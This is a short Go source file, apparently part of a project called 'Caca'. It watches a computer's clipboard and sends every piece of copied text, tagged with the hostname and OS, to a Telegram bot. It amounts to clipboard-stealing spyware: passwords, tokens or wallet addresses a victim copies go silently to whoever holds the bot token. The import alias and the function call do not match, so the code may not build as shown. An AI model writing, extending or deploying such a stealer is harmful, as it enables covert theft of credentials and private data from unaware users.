package clipboard

import (
	"Caca/core/telegram"
	"context"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"golang.design/x/clipboard"
)

func GetEmoji(platform string, clipboardType clipboard.Format) string {
	var osEmoji string

	switch platform {
    case "linux":
        osEmoji = "🐧" // Linux penguin
    case "windows":
        osEmoji = "🪟" // Windows window
    case "darwin":
        osEmoji = "🍏" // MacOS apple
    default:
        osEmoji = "🖥️" // Generic computer emoji
    }
	
	var clipboardEmoji string
    if clipboardType == clipboard.FmtText {
        clipboardEmoji = "📝" // Text clipboard
    } else {
        clipboardEmoji = "📋" // Generic clipboard
    }
    return fmt.Sprintf("%s %s", osEmoji, clipboardEmoji)
	
}

func Send(botToken, chatID, mdata string, hostname, platform string, clipboardType clipboard.Format) {
	emojis := GetEmoji(platform, clipboardType)

	message := fmt.Sprintf("%s | Host: %s | Platform: %s | Data: %s", emojis, hostname, platform, strings.TrimSpace(mdata))

	err := requests.Send2TelegramMessage(botToken, chatID, message)

	if err != nil {
        log.Fatal(err)
    }
}

func Clipboard(botToken, chatID string) {
	err := clipboard.Init()
    if err != nil {
        log.Fatal(err)
    }

    ch := clipboard.Watch(context.TODO(), clipboard.FmtText)
    for data := range ch {
        // Print out clipboard data whenever it is changed
        hostname, err := os.Hostname()
        if err != nil {
            log.Fatal(err)
        }
        platform := runtime.GOOS

		Send(botToken, chatID, string(data), hostname, platform, clipboard.FmtText)

    }

}